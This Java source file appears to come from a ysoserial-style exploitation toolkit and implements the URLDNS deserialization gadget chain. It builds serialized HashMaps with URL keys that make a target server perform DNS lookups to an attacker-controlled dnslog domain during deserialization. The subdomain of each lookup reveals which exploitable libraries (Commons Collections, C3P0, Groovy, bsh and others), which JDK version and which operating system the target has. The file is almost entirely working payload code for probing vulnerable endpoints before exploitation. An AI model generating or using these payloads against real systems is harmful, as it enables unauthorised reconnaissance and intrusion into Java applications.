package com.h2tg.ysogate.payloads.gadgets;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.net.URL;
import java.util.LinkedList;
import java.util.List;

import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;

import static com.h2tg.ysogate.utils.MiscUtils.makeClass;


/**
 * A blog post with more details about this gadget chain is at the url below:
 * https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 * <p>
 * This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 * posting describing how he modified the Java Commons Collections gadget
 * in ysoserial to open a URL. This takes the same idea, but eliminates
 * the dependency on Commons Collections and does a DNS lookup with just
 * standard JDK classes.
 * <p>
 * The Java URL class has an interesting property on its equals and
 * hashCode methods. The URL class will, as a side effect, do a DNS lookup
 * during a comparison (either equals or hashCode).
 * <p>
 * As part of deserialization, HashMap calls hashCode on each key that it
 * deserializes, so using a Java URL object as a serialized key allows
 * it to trigger a DNS lookup.
 * <p>
 * Gadget Chain:
 * HashMap.readObject()
 * HashMap.putVal()
 * HashMap.hash()
 * URL.hashCode()
 */
@Dependencies()
@Authors({Authors.GEBL})
public class URLDNS implements ObjectPayload<Object> {

	public static String[] defaultClass = new String[]{
			"CommonsCollections13567", "CommonsCollections24", "CommonsBeanutils2", "C3P0", "AspectJWeaver", "bsh",
			"Groovy", "Becl", "Jdk7u21", "JRE8u20", "winlinux"};

	public static List<Object> list = new LinkedList();

	public Object getObject(final String command) throws Exception {

		int sep = command.lastIndexOf(':');
		if (sep < 0) {
			throw new IllegalArgumentException("Command format is: <type>:<dnslog_url>");
		}

		String type = command.substring(0, sep);
		String url  = command.substring(sep + 1);

		if ("common".equals(type)) {
			// common 时会测试不常被黑名单禁用的类
			setList("CommonsBeanutils2", url);
			setList("C3P0", url);
			setList("AspectJWeaver", url);
			setList("bsh", url);
			setList("winlinux", url);
		} else if ("all".equals(type)) {
			// all 会测试全部类
			setList("all", url);
		} else if ("null".equals(type)) {
			return getURLDNSGadget(url, null);
		} else {
			// 默认指定类
			setList(type, url);
		}
		return list;
	}

	public static Object getURLDNSGadget(String urls, String clazzName) throws Exception {
		HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
		URL                     url     = new URL("http://" + urls);
		Field                   f       = Class.forName("java.net.URL").getDeclaredField("hashCode");
		f.setAccessible(true);
		f.set(url, Integer.valueOf(0));
		Class<?> clazz = null;

		if (clazzName != null) {
			try {
				clazz = makeClass(clazzName);
			} catch (Exception e) {
				clazz = Class.forName(clazzName);
			}
		}

		hashMap.put(url, clazz);
		f.set(url, Integer.valueOf(-1));
		return hashMap;
	}

	public static void setList(String clazzName, String dnsLog) throws Exception {
		if ("CommonsCollections13567".equals(clazzName)) {
			//CommonsCollections1/3/5/6/7链,需要<=3.2.1版本
			Object cc31or321 = getURLDNSGadget("cc31or321." + dnsLog, "org.apache.commons.collections.functors.ChainedTransformer");
			Object cc322     = getURLDNSGadget("cc322." + dnsLog, "org.apache.commons.collections.ExtendedProperties$1");
			list.add(cc31or321);
			list.add(cc322);
		} else if ("CommonsCollections24".equals(clazzName)) {
			//CommonsCollections2/4链,需要4-4.0版本
			Object cc40 = getURLDNSGadget("cc40." + dnsLog, "org.apache.commons.collections4.functors.ChainedTransformer");
			Object cc41 = getURLDNSGadget("cc41." + dnsLog, "org.apache.commons.collections4.FluentIterable");
			list.add(cc40);
			list.add(cc41);

		} else if ("CommonsBeanutils2".equals(clazzName)) {
			//CommonsBeanutils2链,serialVersionUID不同,1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608
			Object cb17  = getURLDNSGadget("cb17." + dnsLog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
			Object cb18x = getURLDNSGadget("cb18x." + dnsLog, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
			Object cb19x = getURLDNSGadget("cb19x." + dnsLog, "org.apache.commons.beanutils.BeanIntrospectionData");
			list.add(cb17);
			list.add(cb18x);
			list.add(cb19x);

		} else if ("C3P0".equals(clazzName)) {
			//c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为7387108436934414104
			Object c3p092x = getURLDNSGadget("c3p092x." + dnsLog, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
			Object c3p095x = getURLDNSGadget("c3p095x." + dnsLog, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
			list.add(c3p092x);
			list.add(c3p095x);

		} else if ("AspectJWeaver".equals(clazzName)) {
			//AspectJWeaver,需要cc31
			Object ajw = getURLDNSGadget("ajw." + dnsLog, "org.aspectj.weaver.tools.cache.SimpleCache");
			list.add(ajw);

		} else if ("bsh".equals(clazzName)) {
			//bsh,serialVersionUID不同,2.0b4为4949939576606791809,2.0b5为4041428789013517368,2.0.b6无法反序列化
			Object bsh20b4 = getURLDNSGadget("bsh20b4." + dnsLog, "bsh.CollectionManager$1");
			Object bsh20b5 = getURLDNSGadget("bsh20b5." + dnsLog, "bsh.engine.BshScriptEngine");
			Object bsh20b6 = getURLDNSGadget("bsh20b6." + dnsLog, "bsh.collection.CollectionIterator$1");
			list.add(bsh20b4);
			list.add(bsh20b5);
			list.add(bsh20b6);

		} else if ("Groovy".equals(clazzName)) {
			//Groovy,1.7.0-2.4.3,serialVersionUID不同,2.4.x为-8137949907733646644,2.3.x为1228988487386910280
			Object groovy1702311 = getURLDNSGadget("groovy1702311." + dnsLog, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
			Object groovy24x     = getURLDNSGadget("groovy24x." + dnsLog, "groovy.lang.Tuple2");
			Object groovy244     = getURLDNSGadget("groovy244." + dnsLog, "org.codehaus.groovy.runtime.dgm$1170");
			list.add(groovy1702311);
			list.add(groovy24x);
			list.add(groovy244);

		} else if ("Becl".equals(clazzName)) {
			//Becl,JDK<8u251
			Object becl = getURLDNSGadget("becl." + dnsLog, "com.sun.org.apache.bcel.internal.util.ClassLoader");
			list.add(becl);
		} else if ("Jdk7u21".equals(clazzName)) {
			//JDK<=7u21
			Object Jdk7u21 = getURLDNSGadget("Jdk7u21." + dnsLog, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
			list.add(Jdk7u21);
		} else if ("JRE8u20".equals(clazzName)) {
			//7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
			Object JRE8u20 = getURLDNSGadget("JRE8u20." + dnsLog, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
			list.add(JRE8u20);
		} else if ("winlinux".equals(clazzName)) {
			//windows/linux版本判断
			Object linux   = getURLDNSGadget("linux." + dnsLog, "sun.awt.X11.AwtGraphicsConfigData");
			Object windows = getURLDNSGadget("windows." + dnsLog, "sun.awt.windows.WButtonPeer");
			list.add(linux);
			list.add(windows);
		} else if ("all".equals(clazzName)) {
			for (int i = 0; i < defaultClass.length; i++) {
				setList(defaultClass[i], dnsLog);
			}
		} else {
			Object hm = getURLDNSGadget(clazzName.replace(".", "_").replace("$", "_") + "." + dnsLog, clazzName);
			list.add(hm);
		}
	}
}